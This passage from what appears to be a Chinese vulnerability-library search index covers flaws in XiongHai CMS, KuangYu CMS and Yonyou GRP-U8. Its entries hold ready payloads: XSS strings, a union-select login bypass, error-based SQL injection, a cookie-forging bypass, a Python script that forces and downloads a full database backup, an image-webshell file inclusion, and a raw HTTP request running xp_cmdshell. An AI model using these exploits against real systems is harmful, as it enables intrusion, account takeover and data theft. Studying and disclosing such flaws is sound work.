<p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c206\u884c</p> <pre><code>$query = \"SELECT * FROM download WHERE( id= $cid)\";\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/","title":"\u53cd\u5c04\u578bXSS","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u53cd\u5c04\u578bXSS</p> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/contact.php \u7b2c12~15\u884c </p> <pre><code>$page=addslashes($_GET['page']);\nif ($page&lt;&gt;\"\"){\nif ($page&lt;&gt;1){\n$pages=\"\u7b2c\".$page.\"\u9875 - \";\n</code></pre> <p>\u7ecf\u8fc7\u4e00\u6b21addslashes\u51fd\u6570\u5904\u7406\u5c31\u76f4\u63a5\u5e26\u5165\u9875\u9762\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_2","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u6211\u4eec\u8bbf\u95ee\u7f51\u5740\u7684\u8054\u7cfb\u529f\u80fd\uff0c\u627e\u5230\u4e86\u4ee3\u7801\u5bf9\u4e8e\u7684page\u53c2\u6570\uff0c\u5176\u5b9e\u5c31\u662f\u7559\u8a00\u5217\u8868\u7684\u9875\u6570\u3002  \u6211\u4eec\u5c1d\u8bd5\u63d2\u5165\u4e00\u4e2a\u7b80\u5355XSS payload</p> <pre><code>page=&lt;img src=x onerror=alert(/xss/);&gt;\n</code></pre> <p></p> <p>\u6f0f\u6d1e\u5229\u7528\u6210\u529f\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/#_3","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/","title":"\u540e\u53f0\u4e07\u80fd\u5bc6\u7801\u767b\u5f55","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1aadmin/files/login.php</p> <pre><code>&lt;?php \nob_start();\nrequire '../inc/conn.php';\n$login=$_POST['login'];\n$user=$_POST['user'];\n$password=$_POST['password'];\n$checkbox=$_POST['checkbox'];\n\nif ($login&lt;&gt;\"\"){\n$query = \"SELECT * FROM manage WHERE user='$user'\";\n$result = mysql_query($query) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error());\n$users = mysql_fetch_array($result);\n\nif (!mysql_num_rows($result)) {  \necho \"&lt;Script language=JavaScript&gt;alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();&lt;/Script&gt;\";\nexit;\n}else{\n$passwords=$users['password'];\nif(md5($password)&lt;&gt;$passwords){\necho \"&lt;Script language=JavaScript&gt;alert('\u62b1\u6b49\uff0c\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef\u3002');history.back();&lt;/Script&gt;\";\nexit;   \n}\n//\u5199\u5165\u767b\u5f55\u4fe1\u606f\u5e76\u8bb0\u4f4f30\u5929\nif ($checkbox==1){\nsetcookie('user',$user,time()+3600*24*30,'/');\n}else{\nsetcookie('user',$user,0,'/');\n}\necho \"&lt;script&gt;this.location='?r=index'&lt;/script&gt;\";\nexit;\n}\nexit;\nob_end_flush();\n}\n?&gt;\n</code></pre> <p>\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6709\u4e24\u4e2a\u70b9\uff1a</p> <p>1.user\u672a\u7ecf\u8fc7\u8fc7\u6ee4\u76f4\u63a5\u62fc\u63a5\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u8be2</p> <p>2.password\u7684md5\u5bf9\u6bd4\u53ef\u7ed5\u8fc7</p> <p>payload:</p> <pre><code>user:1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#\npassword:1\n\n\u6b64\u5904md5(1)=c4ca4238a0b923820dcc509a6f75849b\n</code></pre> <p>\u6211\u4eec\u8fdb\u5165\u540e\u53f0\uff0c\u5728\u8d26\u53f7\u4e00\u680f\u4e2d\u586b\u5165payload\uff0c\u5bc6\u7801\u8f93\u5165mad5\u52a0\u5bc6\u76841\u5373\u53ef\u6210\u529f\u767b\u5f55\u3002</p> <p> </p> <p>\u6f0f\u6d1e\u5206\u6790</p> <p>\u6211\u4eec\u767b\u5f55\u6211\u4eec\u7684mysql\u6570\u636e\u5e93\uff0c\u67e5\u8be2xhcms\u5e93\u4e0b\u7684manage\u8868  \u6211\u4eec\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u7684\u65b9\u6cd5\uff0c\u53d1\u73b0\u7ed3\u679c\u5728\u6570\u636e\u5e93\u4e0b\u6dfb\u52a0\u4e00\u884c\u65b0\u7684\u53c2\u6570\uff0c\u800c\u6dfb\u52a0\u7684\u503c\u6211\u4eec\u662f\u53ef\u63a7\u7684\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u7684payload\u5c31\u662f\u901a\u8fc7\u4f20\u5165\u65b0\u7684md5\u52a0\u5bc6\u540e\u7684password\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u76f4\u63a5\u767b\u5f55\u7684\u76ee\u7684\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","title":"\u5b58\u50a8\u578bXSS","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php</p> <pre><code>&lt;div class=\"manageinfo\"&gt;\n&lt;ul&gt;\n&lt;div class=\"lou\"&gt;\u56de\u590d #&lt;?php echo $pinglun['id']?&gt; \u697c&lt;/div&gt;\n&lt;?php \n$query2 = \"SELECT * FROM manage\";\n$resul2 = mysql_query($query2) or die('SQL\u8bed\u53e5\u6709\u8bef\uff1a'.mysql_error());\n$manage2 = mysql_fetch_array($resul2);\nif ($manage2['img']==\"\"){\n$touxiang=\"images/manage.jpg\";\n} else{\n$touxiang=$manage2['img'];  \n}\n?&gt;\n&lt;img src=\"&lt;?php echo $touxiang?&gt;\"&gt;\n&lt;strong&gt;&lt;?php echo $manage2['name']?&gt;&lt;span&gt;\u8ba4\u8bc1\u7ad9\u957f&lt;/span&gt;&lt;/strong&gt;\n&lt;li&gt;\u4f4d\u7f6e\uff1a&lt;a&gt;&lt;?php echo $pinglun['rip']?&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;\u65f6\u95f4\uff1a&lt;a&gt;&lt;?php echo tranTime(strtotime($pinglun['rdate']))?&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;\u6765\u81ea\uff1a&lt;a&gt;&lt;?php echo $pinglun['rshebei']?&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n</code></pre> <p>\u8fd9\u91cc\u662f\u4ece$pinglun\u8fd9\u4e2a\u53d8\u91cf\u4e2d\u53d6\u51fa\u5176\u4e2d\u7684\u4fe1\u606f\uff0c\u968f\u540e\u63d2\u5165\u5b58\u50a8\u4fe1\u606f\u7684interaction\u8868</p> <p>\u5728/files/submit.php\u4e2d\u5c06content\u5185\u5bb9\u7ed9\u8fc7\u6ee4\u3002</p> <pre><code>$content=addslashes(strip_tags($content));  //\u8fc7\u6ee4HTML\n</code></pre> <p>\u5728\u8bc4\u8bba\u5904\u53ef\u4ee5\u63d0\u4ea4\u6635\u79f0\u3001\u90ae\u7bb1\u3001\u7f51\u5740\u3001\u8bc4\u8bba\u5185\u5bb9\uff0c\u4f46\u662f\u663e\u793a\u8bc4\u8bba\u548c\u7559\u8a00\u7684\u5730\u65b9\u6709\u6635\u79f0\uff0c\u6240\u4ee5\u53ea\u6709\u6635\u79f0\u5904\u6709\u5b58\u50a8\u578bXSS\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/","title":"\u5b89\u88c5\u6d41\u7a0b\u4e2d\u5b58\u5728SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1a/install/index.php</p> <p>RIPS\u5ba1\u8ba1\u51fa\u73b0sql\u6ce8\u5165\uff0c\u8ddf\u8fdb\u6587\u4ef6\u6bd4\u5bf9\u5ba1\u8ba1\u7ed3\u679c\u3002</p> <p> \u901a\u8bfb\u4ee3\u7801\u53d1\u73b0\u4ee3\u7801\u903b\u8f91\u5982\u4e0b\uff1a</p> <p>1.\u68c0\u6d4b\u662f\u5426\u751f\u6210\u4e86InstallLock.txt\u6587\u4ef6</p> <p>2.\u6267\u884csql\u8bed\u53e5</p> <p>\u5ba1\u8ba1\u53d1\u73b0\u8fd9\u91ccsql\u8bed\u53e5\u786e\u5b9e\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\uff0c\u76f4\u63a5\u63d2\u5165update\u7684sql\u8bed\u53e5\uff0c\u5bfc\u81f4sql\u6ce8\u5165\u3002 </p> <p>\u6f0f\u6d1e\u6f14\u793a\uff1a payload:</p> <pre><code>1' extractvalue(1,concat(0x7e,(select @@version),0x7e))#\n</code></pre> <p>1.\u6839\u636e\u6e90\u7801\u53ef\u77e5\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5220\u9664\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684installLock.txt\u6587\u4ef6\uff08\u5982\u679c\u7f51\u7ad9\u4e0a\u5b58\u5728\u4e00\u4e2a\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff09 </p> <p>2.\u5220\u9664\u540e\u6211\u4eec\u91cd\u65b0\u8fdb\u5165\u5b89\u88c5\u754c\u9762\u3002 </p> <p>\u5728\u7ba1\u7406\u8d26\u53f7\u4e00\u680f\u8f93\u5165\u6211\u4eec\u7684payload\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u89c1\u7684\u62a5\u9519\u6ce8\u5165\u65b9\u6cd5\uff0c</p> <p>\u4e4b\u540e\u6211\u4eec\u63d0\u4ea4\uff1a</p> <p></p> <p>\u53d1\u73b0\u5728\u4fee\u6539\u9519\u8bef\u4e00\u680f\u53d1\u73b0\u7206\u51fa\u6211\u4eec\u7684Mysql\u7248\u672c\uff0c\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/","title":"\u8d8a\u6743","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1ainc/checklogin.php</p> <pre><code>&lt;?php\n$user=$_COOKIE['user'];\nif ($user==\"\"){\nheader(\"Location: ?r=login\");\nexit;   \n}\n?&gt;\n</code></pre> <p>\u8be5\u5904\u7684\u4ee3\u7801\u903b\u8f91\u5b58\u5728\u95ee\u9898\uff0c\u76f4\u63a5\u4eceCOOKIE\u5904\u8d4b\u503c\u7ed9$user</p> <p>\u5982\u679c $user\u4e3a\u7a7a\u5c31\u8df3\u8f6c\u81f3\u767b\u5f55\u754c\u9762</p> <p>\u53cd\u4e4b\u5982\u679c\u4e0d\u4e3a\u7a7a\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u56e0\u6b64\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_2","title":"\u6f0f\u6d1e\u5229\u7528\uff1a","text":"<p>\u6211\u4eec\u9996\u5148\u4eceadmin\u4e2d\u8fdb\u5165\u4f7f\u7528\u4e4b\u524d\u7684\u8d26\u53f7\u767b\u5f55\u540e\u53f0\u3002\u7136\u540e\u627e\u5230\u4e00\u4e2a\u53d1\u5e03\u5185\u5bb9\u7684\u9875\u9762\uff1a\u53c2\u6570\u4e3a?r=newwz</p> <p> \u4e4b\u540e\u6211\u4eec\u9000\u51fa\u767b\u5f55\uff0c\u56de\u5230\u767b\u5f55\u754c\u9762\u3002\u67e5\u770b\u9875\u9762\u7684cookie</p> <p></p> <p>\u53d1\u73b0\u5728cookie\u91cc\u786e\u5b9e\u6ca1\u6709user\u503c\uff0c\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u8df3\u8f6c\u521a\u624d\u767b\u5f55\u540e\u7684\u53d1\u5e03\u9875\u9762\uff0c\u53d1\u73b0\u4f1a\u81ea\u52a8\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762\u3002</p> <p>\u6839\u636e\u4ee3\u7801\u903b\u8f91\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728cookie\u4e2d\u6dfb\u52a0\u4e00\u4e2auser\uff0c\u56e0\u4e3a\u4ee3\u7801\u6ca1\u6709\u5224\u65aduser\u7684\u5177\u4f53\u503c\uff0c\u6240\u4ee5\u586b\u5165\u4efb\u610f\u6570\u503c\u5373\u53ef\u3002  \u6211\u4eec\u5728\u5c1d\u8bd5\u8df3\u8f6c\u9875\u9762  \u53d1\u73b0\u6ca1\u6709\u767b\u5f55\uff0c\u6211\u4eec\u4e5f\u6210\u529f\u8fdb\u5165\u4e86\u540e\u53f0\u9875\u9762\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/#_3","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/","title":"\u540e\u53f0\u6570\u636e\u6cc4\u9732","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u540e\u53f0\u53ef\u4ee5\u76f4\u63a5\u5907\u4efd\u6570\u636e\u5e93\uff0c\u5907\u4efd\u540e\u4e3a.sql.gz\u6587\u4ef6(\u53ef\u4ee5\u5728\u8bbe\u7f6e\u91cc\u66f4\u6539\u662f\u5426\u538b\u7f29)\uff0c\u6587\u4ef6\u540d\u4e3atime\u51fd\u6570\u751f\u6210\u7684\u65f6\u95f4\u6233\uff0c\u53ef\u76f4\u63a5\u7206\u7834\u8fdb\u884c\u4e0b\u8f7d\uff0c\u8fd9\u91cc\u5148\u9644\u4e0aexp</p> <pre><code># !/usr/bin/python3\n# -*- coding:utf-8 -*-\n# author: Forthrglory\nimport requests\nimport time\n\ndef getDatabase(url,username, password):\nsession = requests.session()\n\nu = 'http://%s/admin/index/login.html' % (url)\nhead = {\n'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'\n}\ndata = {\n'username': username,\n'password': password,\n'code': 1\n}\nsession.post(u, data, headers = head)\n\nu = 'http://%s/admin/database/export.html' % (url)\ndata = {\n'layTableCheckbox':'on',\n'tables[0]':'ky_ad',\n'tables[1]':'ky_addons',\n'tables[2]':'ky_bookshelf',\n'tables[3]':'ky_category',\n'tables[4]':'ky_collect',\n'tables[5]':'ky_comment',\n'tables[6]':'ky_config',\n'tables[7]':'ky_crontab',\n'tables[8]':'ky_link',\n'tables[9]':'ky_member',\n'tables[10]':'ky_menu',\n'tables[11]':'ky_news',\n'tables[12]':'ky_novel',\n'tables[13]':'ky_novel_chapter',\n'tables[14]':'ky_route',\n'tables[15]':'ky_slider',\n'tables[16]':'ky_template',\n'tables[17]':'ky_user',\n'tables[18]':'ky_user_menu'\n}\nt = time.strftime(\"%Y%m%d-%H%M%S\", time.localtime())\n\nsession.post(u, data = data)\n\nfor i in range(0, 19):\nu2 = 'http://%s/admin/database/export.html?id=%s&amp;start=0' % (url, str(i))\nsession.get(u2)\n\nt = 'http://' + url + '/public/database/' + t + '-1.sql.gz'\nreturn t\n\nif __name__ == '__main__':\nu = '127.0.0.1'\nusername = 'admin'\npassword = 'admin'\nt = getDatabase(u, username, password)\nprint(t)\n</code></pre> <p>\u8fd0\u884c\u4ee3\u7801\uff0c\u5f97\u5230\u8def\u5f84(\u9ed8\u8ba4\u751f\u6210\u8def\u5f84\u4e3a/public/database/\uff0c\u53ef\u5728\u8bbe\u7f6e\u4e2d\u4fee\u6539) </p> <p>\u76f4\u63a5\u8bbf\u95ee\u4e0b\u8f7d </p> <p>\u53ef\u4ee5\u770b\u5230\u6240\u6709\u6570\u636e\u5e93\u4fe1\u606f\u5168\u5728\u4e86 </p> <p>https://xz.aliyun.com/t/7486</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"\u6587\u4ef6\u5305\u542b","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>1.\u540e\u53f0\u53ef\u4ee5\u4fee\u6539\u6a21\u677f\u6587\u4ef6\uff0c\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u8c03\u7528\u6a21\u677f\u4ee3\u7801\u53ef\u5b9e\u73b0\u6587\u4ef6\u5305\u542b</p> <p> 2.\u9996\u5148\u5728\u8bbe\u7f6e\u4e2d\u4e0a\u4f20logo\u5904\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u662f\u7528\u6237\u7684\u5934\u50cf\u4e0a\u4f20\u5904\u4e0a\u4f20\u6728\u9a6c\uff0c\u56e0\u4e3a\u5934\u50cf\u4f1a\u8fdb\u884c\u7f29\u653e\uff0c\u5bfc\u81f4\u6587\u4ef6\u5185\u5bb9\u88ab\u4fee\u6539  3.\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u8def\u5f84\uff0c\u56fe\u7247\u9a6c\u5185\u5bb9\u4e3a&lt;?php phpinfo(); ?&gt;\uff0c\u9700\u8981\u6ce8\u610fphp\u4ee3\u7801\u5fc5\u987b\u5305\u542b\u6700\u540e\u7684?&gt;\uff0c\u5426\u5219\u4f1a\u62a5\u8bed\u6cd5\u9519\u8bef  4.\u8fdb\u5165\u6a21\u677f\u529f\u80fd\u5904\uff0c\u5728index.html\uff0c\u5373\u4e3b\u9875\u6a21\u677f\u4e2d\u6dfb\u52a0\u6a21\u677f\u4ee3\u7801\uff0c\u540c\u6837\u9700\u8981\u6ce8\u610f\uff0c\u8def\u5f84\u4e0d\u80fd\u4ee5/\u5f00\u5934\uff0c\u5426\u5219\u4f1a\u88ab\u627e\u4e0d\u5230\u9519\u8bef</p> <pre><code>{include file=\"uploads/config/20200325/033966a7d27975812915522464e252a3.jpg\" /}\n</code></pre> <p> \u63a5\u7740\u6253\u5f00\u4e3b\u9875\uff0c\u5373\u53ef\u770b\u5230phpinfo\u4fe1\u606f</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7486</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"\u7528\u53cb GRP-u8\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>GRP-u8</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>POST /Proxy HTTP/1.1\nAccept: Accept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)\nHost: host\nContent-Length: 357\nConnection: Keep-Alive\nCache-Control: no-cache\n\n\ncVer=9.8.0&amp;dp=&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;&lt;R9PACKET version=\"1\"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;exec xp_cmdshell 'ipconfig'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt; \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"\u7528\u53cbGRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6SQL\u6ce8\u5165\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u4fe1\u606f:","text":"<p>\u7528\u53cb\u516c\u53f8\u6210\u7acb\u4e8e1988\u5e74\uff0c\u5168\u9762\u63d0\u4f9b\u5177\u6709\u81ea\u4e3b\u77e5\u8bc6\u4ea7\u6743\u7684\u4f01\u4e1a\u7ba1\u7406/ERP\u8f6f\u4ef6\u3001\u670d\u52a1\u4e0e\u89e3\u51b3\u65b9\u6848\uff0c\u662f\u4e2d\u56fd\u6700\u5927\u7684\u7ba1\u7406\u8f6f\u4ef6\u3001ERP\u8f6f\u4ef6\u3001\u96c6\u56e2\u7ba1\u7406\u8f6f\u4ef6\u3001\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u8f6f\u4ef6\u3001\u5ba2\u6237\u5173\u7cfb\u7ba1\u7406\u8f6f\u4ef6\u53ca\u5c0f\u578b\u4f01\u4e1a\u7ba1\u7406\u8f6f\u4ef6\u63d0\u4f9b\u5546\u3002\u5176GRP-U8\u884c\u653f\u4e8b\u4e1a\u5185\u63a7\u7ba1\u7406\u8f6f\u4ef6\u7279\u5b9a\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u6267\u884c\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u590d\u73b0:","text":"<p>fofa_dork: 